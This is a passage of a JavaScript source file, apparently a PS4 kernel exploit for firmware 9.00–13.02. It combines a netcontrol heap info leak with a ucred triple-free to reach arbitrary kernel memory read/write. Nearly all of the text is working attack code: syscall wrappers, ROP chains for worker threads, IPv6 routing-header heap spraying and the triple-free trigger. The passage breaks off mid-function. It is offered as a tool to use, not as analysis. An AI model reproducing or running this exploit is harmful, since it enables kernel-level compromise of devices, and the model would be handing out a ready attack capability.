// =============================================================================
//  netctrl_info_leak.js – PS4 Kernel Exploit (Info‑Leak + Triple‑Free)
//  Uses BNET_CMD_GET_DEFAULT_ROUTE heap leak to recover kernel base,
//  then the ucred triple‑free (netevent + setuid) for arbitrary r/w.
//  Firmware: 9.00 – 13.02
//  Requires: userland.js, kernel.js, binloader.js
// =============================================================================

include('userland.js');
if (typeof libc_addr === 'undefined') include('userland.js');
include('kernel.js');
include('binloader.js');

// ======================== Syscall wrappers ========================
if (!String.prototype.padStart) {
  String.prototype.padStart = function(t,l){t>>=0;l=String(l||' ');if(this.length>t)return String(this);t-=this.length;if(t>l.length)l+=l.repeat(t/l.length);return l.slice(0,t)+String(this);};
}
fn.register(0x29, 'dup', ['bigint'], 'bigint');
fn.register(0x06, 'close', ['bigint'], 'bigint');
fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
fn.register(0x16A, 'kqueue', [], 'bigint');
fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
fn.register(0x17, 'setuid', ['number'], 'bigint');
fn.register(20, 'getpid', [], 'bigint');
fn.register(0x14B, 'sched_yield', [], 'bigint');
fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint');
fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
fn.register(libc_addr.add(0x6CA50), 'longjmp', ['bigint', 'bigint'], 'bigint');

var setjmp = fn.setjmp;
var longjmp = fn.longjmp;
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp_addr = libc_addr.add(0x6CA50);

var dup = fn.dup, close = fn.close, read = fn.read, write = fn.write;
var ioctl = fn.ioctl, pipe = fn.pipe, kqueue = fn.kqueue;
var socket = fn.socket, socketpair = fn.socketpair;
var getsockopt = fn.getsockopt, setsockopt = fn.setsockopt;
var setuid = fn.setuid, getpid = fn.getpid;
var sched_yield = fn.sched_yield;
var cpuset_getaffinity = fn.cpuset_getaffinity;
var cpuset_setaffinity = fn.cpuset_setaffinity;
var rtprio_thread = fn.rtprio_thread;
var netcontrol = fn.netcontrol;
var thr_new = fn.thr_new, thr_kill = fn.thr_kill;
var nanosleep = fn.nanosleep, fcntl = fn.fcntl;

// Syscall wrapper addresses for ROP
var read_wrapper = syscalls.map.get(0x03);
var write_wrapper = syscalls.map.get(0x04);
var recvmsg_wrapper = syscalls.map.get(0x1B);
var readv_wrapper = syscalls.map.get(0x78);
var writev_wrapper = syscalls.map.get(0x79);
var thr_exit_wrapper = syscalls.map.get(0x1af);
var setsockopt_wrapper = syscalls.map.get(0x69);
var getsockopt_wrapper = syscalls.map.get(0x76);
var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8);
var rtprio_thread_wrapper = syscalls.map.get(0x1D2);

var BigInt_Error = new BigInt(0xFFFFFFFF,0xFFFFFFFF);
var KERNEL_PID = 0;
var SYSCORE_AUTHID = new BigInt(0x48000000,0x00000007);
var FIOSETOWN = 0x8004667C;
var PAGE_SIZE = 0x4000;

// Netcontrol commands
var BNET_CMD_GET_DEFAULT_ROUTE = 2;          // info leak
var BNET_FLAG_COPY_OUT        = 0x20000000; // kernel -> user
var BNET_BUF_MAX              = 160;         // 0xA0

// Netevent commands (triple‑free)
var NET_CONTROL_NETEVENT_SET_QUEUE   = 0x20000003;
var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;

// Socket/Protocol constants
var AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
var IPPROTO_IPV6 = 41, IPV6_RTHDR = 51, IPV6_RTHDR_TYPE_0 = 0;
var SO_SNDBUF = 0x1001, SOL_SOCKET = 0xffff;
var UIO_SYSSPACE = 1, UIO_IOV_NUM = 0x14, MSG_IOV_NUM = 0x17;
var RTHDR_TAG = 0x13370000;
var F_SETFL = 4, O_NONBLOCK = 4;

// Exploit tuning
var IPV6_SOCK_NUM = 96;
var IOV_THREAD_NUM = 8, UIO_THREAD_NUM = 8;
var MAIN_CORE = 4, MAIN_RTPRIO = 0x100;
var MAX_ROUNDS_TWIN = 5, MAX_ROUNDS_TRIPLET = 200;
var TRIPLEFREE_ITERATIONS = 8, KQUEUE_ITERATIONS = 5000;

// Global objects
var twins = [0,0], triplets = [0,0,0];
var ipv6_socks = new Array(IPV6_SOCK_NUM);
var spray_rthdr, spray_rthdr_len, leak_rthdr;
var spray_rthdr_rop, read_rthdr_rop, check_len;
var uaf_socket;
var uio_sock_0, uio_sock_1, iov_sock_0, iov_sock_1;
var masterRpipeFd, masterWpipeFd, victimRpipeFd, victimWpipeFd;
var fdt_ofiles, master_r_pipe_data, victim_r_pipe_data;
var kl_lock, kq_fdp;

// Worker helpers
var iov_recvmsg_workers=[], uio_readv_workers=[], uio_writev_workers=[], spray_ipv6_worker;
var msg, msgIov, uioIovRead, uioIovWrite;
var iov_thread_ready, iov_thread_done, iov_signal_buf;
var uio_readv_thread_ready, uio_readv_thread_done, uio_readv_signal_buf;
var uio_writev_thread_ready, uio_writev_thread_done, uio_writev_signal_buf;
var spray_ipv6_ready, spray_ipv6_done, spray_ipv6_signal_buf, spray_ipv6_stack;

var master_pipe_buf, victim_pipe_buf, tmp;
var prev_core=-1, prev_rtprio=-1, cleanup_called=false;

// Misc global buffers
var sockopt_val_buf, nc_set_buf, nc_clear_buf;
var spawn_thr_args, spawn_tid, spawn_cpid;
var nanosleep_timespec, cpu_mask_buf, rtprio_scratch;

// ======================== Helpers (memory, threading) ========================
function write8(a,v){mem.view(a).setUint8(0,v);}
function write16(a,v){mem.view(a).setUint16(0,v,true);}
function write32(a,v){mem.view(a).setUint32(0,v,true);}
function write64(a,v){mem.view(a).setBigInt(0,new BigInt(v),true);}
function read8(a){return mem.view(a).getUint8(0);}
function read16(a){return mem.view(a).getUint16(0,true);}
function read32(a){return mem.view(a).getUint32(0,true);}
function read64(a){return mem.view(a).getBigInt(0,true);}
function malloc(s){return mem.malloc(s);}
function hex(v){return v instanceof BigInt?v.toString():'0x'+v.toString(16).padStart(2,'0');}

function fill_buffer_64(buf, val, len) {
  for (var i=0; i<len; i+=8) write64(buf.add(i), val);
}

function build_rthdr(buf, size) {
  var len = (size>>3)-1 & ~1;
  write8(buf.add(0), 0);
  write8(buf.add(1), len);
  write8(buf.add(2), IPV6_RTHDR_TYPE_0);
  write8(buf.add(3), len>>1);
  return (len+1)<<3;
}

function set_rthdr(sd, buf, len) {
  return setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}
function get_rthdr(sd, buf, maxlen) {
  var lenp = malloc(4); write32(lenp, maxlen);
  var r = getsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, lenp);
  if(r.eq(BigInt_Error)) throw new Error('getsockopt failed');
  return read32(lenp);
}
function free_rthdr(sd) { set_rthdr(sd, new BigInt(0), 0); }
function free_rthdrs(sds) { for(var s of sds) if(!s.eq(BigInt_Error)) free_rthdr(s); }

function pin_to_core(core) {
  write32(cpu_mask_buf, 1<<core);
  cpuset_setaffinity(3,1,BigInt_Error,0x10,cpu_mask_buf);
}
function get_current_core() {
  cpuset_getaffinity(3,1,BigInt_Error,0x10,cpu_mask_buf);
  var m = read32(cpu_mask_buf), p=0;
  while(m){m>>>=1;p++;}
  return p-1;
}
function set_rtprio(prio) {
  write16(rtprio_scratch, 2); write16(rtprio_scratch.add(2), prio);
  rtprio_thread(1, 0, rtprio_scratch);
}
function get_rtprio() {
  write16(rtprio_scratch, 2); write16(rtprio_scratch.add(2), 0);
  rtprio_thread(0, 0, rtprio_scratch);
  return read16(rtprio_scratch.add(2));
}
function nanosleep_fun(ns) {
  write64(nanosleep_timespec, Math.floor(ns/1e9));
  write64(nanosleep_timespec.add(8), ns%1e9);
  nanosleep(nanosleep_timespec);
}
function wait_for(addr, thresh) { while(!read64(addr).eq(thresh)) nanosleep_fun(1); }

// Thread spawn helpers (ROP)
function rop_regen_and_loop(last_rop_entry, nentries) {
  var new_entry = last_rop_entry.add(8);
  var copy = last_rop_entry.sub(nentries*8).add(8);
  var loop = last_rop_entry.sub(nentries*8).add(8);
  for(var i=0; i<nentries; i++) {
    write64(new_entry.add(0x0), gadgets.POP_RDI_RET);
    write64(new_entry.add(0x8), copy);
    write64(new_entry.add(0x10), gadgets.POP_RAX_RET);
    write64(new_entry.add(0x18), read64(copy));
    write64(new_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
    copy=copy.add(8); new_entry=new_entry.add(0x28);
  }
  write64(new_entry.add(0x0), gadgets.POP_RSP_RET);
  write64(new_entry.add(0x8), loop);
}

function spawn_thread(rop_array, loop_size, predefStack) {
  var rop_addr = predefStack || malloc(0x600);
  for(var i=0; i<rop_array.length; i++)
    write64(rop_addr.add(i*8), rop_array[i]);
  if(loop_size) rop_regen_and_loop(rop_addr.add(rop_array.length*8).sub(8), loop_size);
  var jmpbuf = malloc(0x60);
  write64(jmpbuf.add(0x00), gadgets.RET);
  write64(jmpbuf.add(0x10), rop_addr);
  write32(jmpbuf.add(0x40), saved_fpu_ctrl);
  write32(jmpbuf.add(0x44), saved_mxcsr);
  var stack = malloc(0x100), tls = malloc(0x40);
  write64(spawn_thr_args.add(0x00), longjmp_addr);
  write64(spawn_thr_args.add(0x08), jmpbuf);
  write64(spawn_thr_args.add(0x10), stack);
  write64(spawn_thr_args.add(0x18), new BigInt(0x100));
  write64(spawn_thr_args.add(0x20), tls);
  write64(spawn_thr_args.add(0x28), new BigInt(0x40));
  write64(spawn_thr_args.add(0x30), spawn_tid);
  write64(spawn_thr_args.add(0x38), spawn_cpid);
  var r = thr_new(spawn_thr_args, 0x68);
  if(!r.eq(0)) throw new Error('thr_new: '+hex(r));
  return read64(spawn_tid);
}

function init_threading() {
  var jmpbuf = malloc(0x60);
  setjmp(jmpbuf);
  saved_fpu_ctrl = read32(jmpbuf.add(0x40));
  saved_mxcsr = read32(jmpbuf.add(0x44));
}

// ======================== Worker ROP chains ========================
function iov_recvmsg_worker_rop(ready, run_fd, done, signal_buf) {
  var rop=[new BigInt(0)]; // placeholder
  var cpu=malloc(0x10); write16(cpu,1<<MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET,new BigInt(3),gadgets.POP_RSI_RET,new BigInt(1),
           gadgets.POP_RDX_RET,BigInt_Error,gadgets.POP_RCX_RET,new BigInt(0x10),
           gadgets.POP_R8_RET,cpu,cpuset_setaffinity_wrapper);
  var rbuf=malloc(4); write16(rbuf,2); write16(rbuf.add(2),MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET,new BigInt(1),gadgets.POP_RSI_RET,new BigInt(0),
           gadgets.POP_RDX_RET,rbuf,rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET,ready,gadgets.POP_RAX_RET,new BigInt(1),
           gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_start=rop.length;
  rop.push(gadgets.POP_RDI_RET,run_fd,gadgets.POP_RSI_RET,signal_buf,
           gadgets.POP_RDX_RET,new BigInt(1),read_wrapper);
  rop.push(gadgets.POP_RDI_RET,new BigInt(iov_sock_0),
           gadgets.POP_RSI_RET,msg,gadgets.POP_RDX_RET,new BigInt(0),
           recvmsg_wrapper);
  rop.push(gadgets.POP_RDI_RET,done,gadgets.POP_RAX_RET,new BigInt(1),
           gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  return {rop, loop_size:rop.length-loop_start};
}

function uio_readv_worker_rop(ready,run_fd,done,signal_buf) {
  var rop=[new BigInt(0)];
  var cpu=malloc(0x10); write16(cpu,1<<MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET,new BigInt(3),gadgets.POP_RSI_RET,new BigInt(1),
           gadgets.POP_RDX_RET,BigInt_Error,gadgets.POP_RCX_RET,new BigInt(0x10),
           gadgets.POP_R8_RET,cpu,cpuset_setaffinity_wrapper);
  var rbuf=malloc(4); write16(rbuf,2); write16(rbuf.add(2),MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET,new BigInt(1),gadgets.POP_RSI_RET,new BigInt(0),
           gadgets.POP_RDX_RET,rbuf,rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET,ready,gadgets.POP_RAX_RET,new BigInt(1),
           gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_start=rop.length;
  rop.push(gadgets.POP_RDI_RET,run_fd,gadgets.POP_RSI_RET,signal_buf,
           gadgets.POP_RDX_RET,new BigInt(1),read_wrapper);
  rop.push(gadgets.POP_RDI_RET,new BigInt(uio_sock_0),
           gadgets.POP_RSI_RET,uioIovWrite,gadgets.POP_RDX_RET,new BigInt(UIO_IOV_NUM),
           readv_wrapper);
  rop.push(gadgets.POP_RDI_RET,done,gadgets.POP_RAX_RET,new BigInt(1),
           gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  return {rop, loop_size:rop.length-loop_start};
}

function uio_writev_worker_rop(ready,run_fd,done,signal_buf) {
  var rop=[new BigInt(0)];
  var cpu=malloc(0x10); write16(cpu,1<<MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET,new BigInt(3),gadgets.POP_RSI_RET,new BigInt(1),
           gadgets.POP_RDX_RET,BigInt_Error,gadgets.POP_RCX_RET,new BigInt(0x10),
           gadgets.POP_R8_RET,cpu,cpuset_setaffinity_wrapper);
  var rbuf=malloc(4); write16(rbuf,2); write16(rbuf.add(2),MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET,new BigInt(1),gadgets.POP_RSI_RET,new BigInt(0),
           gadgets.POP_RDX_RET,rbuf,rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET,ready,gadgets.POP_RAX_RET,new BigInt(1),
           gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_start=rop.length;
  rop.push(gadgets.POP_RDI_RET,run_fd,gadgets.POP_RSI_RET,signal_buf,
           gadgets.POP_RDX_RET,new BigInt(1),read_wrapper);
  rop.push(gadgets.POP_RDI_RET,new BigInt(uio_sock_1),
           gadgets.POP_RSI_RET,uioIovRead,gadgets.POP_RDX_RET,new BigInt(UIO_IOV_NUM),
           writev_wrapper);
  rop.push(gadgets.POP_RDI_RET,done,gadgets.POP_RAX_RET,new BigInt(1),
           gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  return {rop, loop_size:rop.length-loop_start};
}

function ipv6_spray_and_read_rop(ready,run_fd,done,signal_buf) {
  var rop=[new BigInt(0)];
  var cpu=malloc(0x10); write16(cpu,1<<MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET,new BigInt(3),gadgets.POP_RSI_RET,new BigInt(1),
           gadgets.POP_RDX_RET,BigInt_Error,gadgets.POP_RCX_RET,new BigInt(0x10),
           gadgets.POP_R8_RET,cpu,cpuset_setaffinity_wrapper);
  var rbuf=malloc(4); write16(rbuf,2); write16(rbuf.add(2),MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET,new BigInt(1),gadgets.POP_RSI_RET,new BigInt(0),
           gadgets.POP_RDX_RET,rbuf,rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET,ready,gadgets.POP_RAX_RET,new BigInt(1),
           gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_start=rop.length;
  rop.push(gadgets.POP_RDI_RET,run_fd,gadgets.POP_RSI_RET,signal_buf,
           gadgets.POP_RDX_RET,new BigInt(1),read_wrapper);
  for(var i=0;i<ipv6_socks.length;i++) {
    rop.push(gadgets.POP_RDI_RET,ipv6_socks[i],
             gadgets.POP_RSI_RET,new BigInt(IPPROTO_IPV6),
             gadgets.POP_RDX_RET,new BigInt(IPV6_RTHDR),
             gadgets.POP_RCX_RET,spray_rthdr_rop.add(i*UCRED_SIZE),
             gadgets.POP_R8_RET,new BigInt(spray_rthdr_len),
             setsockopt_wrapper);
  }
  for(var i=0;i<ipv6_socks.length;i++) {
    rop.push(gadgets.POP_RDI_RET,ipv6_socks[i],
             gadgets.POP_RSI_RET,new BigInt(IPPROTO_IPV6),
             gadgets.POP_RDX_RET,new BigInt(IPV6_RTHDR),
             gadgets.POP_RCX_RET,read_rthdr_rop.add(i*8),
             gadgets.POP_R8_RET,check_len,
             getsockopt_wrapper);
  }
  rop.push(gadgets.POP_RDI_RET,done,gadgets.POP_RAX_RET,new BigInt(1),
           gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  rop.push(gadgets.POP_RDI_RET,new BigInt(0),thr_exit_wrapper);
  return {rop, loop_size:0};
}

// ======================== Setup / Cleanup ========================
function create_workers() {
  var sock=malloc(8);
  for(var i=0;i<IOV_THREAD_NUM;i++) {
    var ready=iov_thread_ready.add(8*i), done=iov_thread_done.add(8*i);
    var sig=iov_signal_buf.add(8*i);
    socketpair(AF_UNIX,SOCK_STREAM,0,sock);
    var p0=read32(sock), p1=read32(sock.add(4));
    var r=iov_recvmsg_worker_rop(ready,new BigInt(p0),done,sig);
    iov_recvmsg_workers[i]={rop:r.rop,loop_size:r.loop_size,pipe_0:p0,pipe_1:p1,ready,done,signal_buf:sig};
  }
  for(var i=0;i<UIO_THREAD_NUM;i++) {
    var ready=uio_readv_thread_ready.add(8*i), done=uio_readv_thread_done.add(8*i);
    var sig=uio_readv_signal_buf.add(8*i);
    socketpair(AF_UNIX,SOCK_STREAM,0,sock);
    var p0=read32(sock), p1=read32(sock.add(4));
    var r=uio_readv_worker_rop(ready,new BigInt(p0),done,sig);
    uio_readv_workers[i]={rop:r.rop,loop_size:r.loop_size,pipe_0:p0,pipe_1:p1,ready,done,signal_buf:sig};
  }
  for(var i=0;i<UIO_THREAD_NUM;i++) {
    var ready=uio_writev_thread_ready.add(8*i), done=uio_writev_thread_done.add(8*i);
    var sig=uio_writev_signal_buf.add(8*i);
    socketpair(AF_UNIX,SOCK_STREAM,0,sock);
    var p0=read32(sock), p1=read32(sock.add(4));
    var r=uio_writev_worker_rop(ready,new BigInt(p0),done,sig);
    uio_writev_workers[i]={rop:r.rop,loop_size:r.loop_size,pipe_0:p0,pipe_1:p1,ready,done,signal_buf:sig};
  }
  var ready=spray_ipv6_ready, done=spray_ipv6_done, sig=spray_ipv6_signal_buf;
  socketpair(AF_UNIX,SOCK_STREAM,0,sock);
  var p0=read32(sock), p1=read32(sock.add(4));
  var r=ipv6_spray_and_read_rop(ready,new BigInt(p0),done,sig);
  spray_ipv6_worker={rop:r.rop,loop_size:r.loop_size,pipe_0:p0,pipe_1:p1,ready,done,signal_buf:sig};
}

function init_workers() {
  init_threading();
  for(var w of iov_recvmsg_workers) w.thread_id = Number(spawn_thread(w.rop,w.loop_size).and(0xFFFFFFFF));
  for(var w of uio_readv_workers) w.thread_id = Number(spawn_thread(w.rop,w.loop_size).and(0xFFFFFFFF));
  for(var w of uio_writev_workers) w.thread_id = Number(spawn_thread(w.rop,w.loop_size).and(0xFFFFFFFF));
}

function trigger_iov_recvmsg() {
  for(var w of iov_recvmsg_workers) write64(w.done,0);
  for(var w of iov_recvmsg_workers) write(new BigInt(w.pipe_1), w.signal_buf, 1);
}
function wait_iov_recvmsg() { for(var w of iov_recvmsg_workers) wait_for(w.done,1); }
function trigger_uio_readv() {
  for(var w of uio_readv_workers) write64(w.done,0);
  for(var w of uio_readv_workers) write(new BigInt(w.pipe_1), w.signal_buf, 1);
}
function wait_uio_readv() { for(var w of uio_readv_workers) wait_for(w.done,1); }
function trigger_uio_writev() {
  for(var w of uio_writev_workers) write64(w.done,0);
  for(var w of uio_writev_workers) write(new BigInt(w.pipe_1), w.signal_buf, 1);
}
function wait_uio_writev() { for(var w of uio_writev_workers) wait_for(w.done,1); }
function trigger_ipv6_spray_and_read() {
  write64(spray_ipv6_worker.done,0);
  spray_ipv6_worker.thread_id = Number(spawn_thread(spray_ipv6_worker.rop,0,spray_ipv6_stack).and(0xFFFFFFFF));
  write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
}
function wait_ipv6_spray_and_read() { wait_for(spray_ipv6_worker.done,1); }

function setup() {
  log('Setting up exploit...');
  prev_core=get_current_core(); prev_rtprio=get_rtprio();
  pin_to_core(MAIN_CORE); set_rtprio(MAIN_RTPRIO);

  // Allocate global buffers
  spray_rthdr=malloc(UCRED_SIZE); leak_rthdr=malloc(UCRED_SIZE);
  spray_rthdr_rop=malloc(IPV6_SOCK_NUM*UCRED_SIZE);
  read_rthdr_rop=malloc(IPV6_SOCK_NUM*8);
  check_len=malloc(4); write32(check_len,8);
  msg=malloc(MSG_HDR_SIZE); msgIov=malloc(MSG_IOV_NUM*IOV_SIZE);
  uioIovRead=malloc(UIO_IOV_NUM*IOV_SIZE); uioIovWrite=malloc(UIO_IOV_NUM*IOV_SIZE);
  var dummy=malloc(0x1000); fill_buffer_64(dummy,new BigInt(0x41414141,0x41414141),0x1000);
  write64(uioIovRead.add(0), dummy); write64(uioIovWrite.add(0), dummy);

  iov_thread_ready=malloc(8*IOV_THREAD_NUM); iov_thread_done=malloc(8*IOV_THREAD_NUM);
  iov_signal_buf=malloc(8*IOV_THREAD_NUM);
  uio_readv_thread_ready=malloc(8*UIO_THREAD_NUM); uio_readv_thread_done=malloc(8*UIO_THREAD_NUM);
  uio_readv_signal_buf=malloc(8*UIO_THREAD_NUM);
  uio_writev_thread_ready=malloc(8*UIO_THREAD_NUM); uio_writev_thread_done=malloc(8*UIO_THREAD_NUM);
  uio_writev_signal_buf=malloc(8*UIO_THREAD_NUM);
  spray_ipv6_ready=malloc(8); spray_ipv6_done=malloc(8); spray_ipv6_signal_buf=malloc(8);
  spray_ipv6_stack=malloc(0x2000);

  master_pipe_buf=malloc(PIPEBUF_SIZE); victim_pipe_buf=malloc(PIPEBUF_SIZE);
  tmp=malloc(PAGE_SIZE);
  sockopt_val_buf=malloc(4); nc_set_buf=malloc(8); nc_clear_buf=malloc(8);
  spawn_thr_args=malloc(0x80); spawn_tid=malloc(8); spawn_cpid=malloc(8);
  nanosleep_timespec=malloc(0x10); cpu_mask_buf=malloc(0x10); rtprio_scratch=malloc(4);

  // Prepare spray buffers
  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
  for(var i=0;i<IPV6_SOCK_NUM;i++) {
    build_rthdr(spray_rthdr_rop.add(i*UCRED_SIZE), UCRED_SIZE);
    write32(spray_rthdr_rop.add(i*UCRED_SIZE+4), RTHDR_TAG|i);
  }
  write64(msg.add(0x10), msgIov); write64(msg.add(0x18), MSG_IOV_NUM);

  // Create socket pairs for uio/iov
  var sock=malloc(8);
  socketpair(AF_UNIX,SOCK_STREAM,0,sock);
  uio_sock_0=read32(sock); uio_sock_1=read32(sock.add(4));
  socketpair(AF_UNIX,SOCK_STREAM,0,sock);
  iov_sock_0=read32(sock); iov_sock_1=read32(sock.add(4));

  // Create IPv6 sockets
  for(var i=0;i<IPV6_SOCK_NUM;i++) ipv6_socks[i]=socket(AF_INET6,SOCK_STREAM,0);
  free_rthdrs(ipv6_socks);

  // Create pipe pair for r/w
  var ps=malloc(8);
  pipe(ps); masterRpipeFd=read32(ps); masterWpipeFd=read32(ps.add(4));
  pipe(ps); victimRpipeFd=read32(ps); victimWpipeFd=read32(ps.add(4));
  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);

  create_workers();
  init_workers();
  log('Workers spawned: iov '+IOV_THREAD_NUM+' uio_r '+UIO_THREAD_NUM+' uio_w '+UIO_THREAD_NUM);
}

function cleanup(killWorkers) {
  if(cleanup_called) return;
  cleanup_called=true;
  log('Cleaning up...');
  for(var s of ipv6_socks) close(s);
  for(var w of iov_recvmsg_workers) {
    if(w) { write(new BigInt(w.pipe_1), w.signal_buf, 1);
      if(killWorkers && w.thread_id) thr_kill(w.thread_id, 9); }
  }
  for(var w of uio_readv_workers) {
    if(w) { write(new BigInt(w.pipe_1), w.signal_buf, 1);
      if(killWorkers && w.thread_id) thr_kill(w.thread_id, 9); }
  }
  for(var w of uio_writev_workers) {
    if(w) { write(new BigInt(w.pipe_1), w.signal_buf, 1);
      if(killWorkers && w.thread_id) thr_kill(w.thread_id, 9); }
  }
  if(spray_ipv6_worker) {
    write(new BigInt(spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
    if(killWorkers && spray_ipv6_worker.thread_id) thr_kill(spray_ipv6_worker.thread_id, 9);
  }
  close(new BigInt(uio_sock_1)); close(new BigInt(uio_sock_0));
  close(new BigInt(iov_sock_1)); close(new BigInt(iov_sock_0));
  if(prev_core>=0){ pin_to_core(prev_core); prev_core=-1; }
  set_rtprio(prev_rtprio);
  log('Cleanup done');
}

// ======================== Twin / Triplet finding ========================
function find_twins() {
  for(var attempt=0; attempt<MAX_ROUNDS_TWIN; attempt++) {
    for(var i=0;i<ipv6_socks.length;i++) {
      write32(spray_rthdr.add(4), RTHDR_TAG|i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }
    for(var i=0;i<ipv6_socks.length;i++) {
      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
      var val=read32(leak_rthdr.add(4)), j=val&0xFFFF;
      if((val&0xFFFF0000)==RTHDR_TAG && i!=j) {
        twins[0]=i; twins[1]=j;
        log('Twins: ['+i+'] ['+j+']');
        return true;
      }
    }
  }
  return false;
}

function find_triplet(master, exclude, maxRounds) {
  if(!maxRounds) maxRounds=MAX_ROUNDS_TRIPLET;
  for(var r=0; r<maxRounds; r++) {
    for(var i=0;i<ipv6_socks.length;i++) {
      if(i==master || i==exclude) continue;
      write32(spray_rthdr.add(4), RTHDR_TAG|i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }
    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
    var val=read32(leak_rthdr.add(4)), j=val&0xFFFF;
    if((val&0xFFFF0000)==RTHDR_TAG && j!=master && j!=exclude) return j;
  }
  return -1;
}

// ======================== Info Leak via BNET_CMD_GET_DEFAULT_ROUTE ========================
function netcontrol_heap_leak() {
  var buf = malloc(BNET_BUF_MAX);
  // cmd=2, flags=BNET_FLAG_COPY_OUT
  var ret = netcontrol(new BigInt(0), BNET_FLAG_COPY_OUT, buf, BNET_BUF_MAX);
  if (ret.neq(0)) {
    log('netcontrol leak failed: '+hex(ret));
    return null;
  }
  return buf;
}

// Heuristic to find kernel base from leaked heap data
function try_find_kernel_base(leaked) {
  for (var off = 0; off < 152; off += 8) {
    var val = read64(leaked.add(off));
    if (val.hi.eq(0xFFFFFFFF) && (val.lo.and(0xFF000000)).eq(0x80000000)) {
      // Attempt known offsets (pipe, socket, file zones) – use KL_LOCK as fallback
      // We don't have all zone offsets in kernel_offset, so just use alignment
      var aligned = new BigInt(val.hi, val.lo.and(0xFFFFF000));
      log('Tentative kernel base from heap leak: '+hex(aligned));
      return aligned;
    }
  }
  log('No kernel pointer found in heap leak');
  return null;
}

// ======================== Triple‑free (ucred) ========================
function trigger_ucred_triplefree() {
  var success = false;
  write64(msgIov.add(0x0), 1); write64(msgIov.add(0x8), 1);
  for (var attempt = 0; attempt < TRIPLEFREE_ITERATIONS && !success; attempt++) {
    log('Triple-free attempt '+(attempt+1)+'/'+TRIPLEFREE_ITERATIONS);
    var dummy = socket(AF_UNIX, SOCK_STREAM, 0);
    write32(nc_set_buf, Number(dummy.and(0xFFFFFFFF)));
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
    close(new BigInt(dummy));
    setuid(1);
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    setuid(1);
    write32(nc_clear_buf, uaf_socket);
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
    // reclaim with iov
    for (var i=0; i<32; i++) {
      trigger_iov_recvmsg(); sched_yield();
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg(); read(new BigInt(iov_sock_0), tmp, 1);
    }
    close(dup(new BigInt(uaf_socket)));
    if (!find_twins()) { close(new BigInt(uaf_socket)); continue; }
    log('Twins found, freeing...');
    free_rthdr(ipv6_socks[twins[1]]);
    for (var cnt=0; cnt<10000; cnt++) {
      trigger_iov_recvmsg(); sched_yield();
      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
      if (read32(leak_rthdr) == 1) break;
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg(); read(new BigInt(iov_sock_0), tmp, 1);
    }
    if (cnt==10000) { close(new BigInt(uaf_socket)); continue; }
    triplets[0]=twins[0];
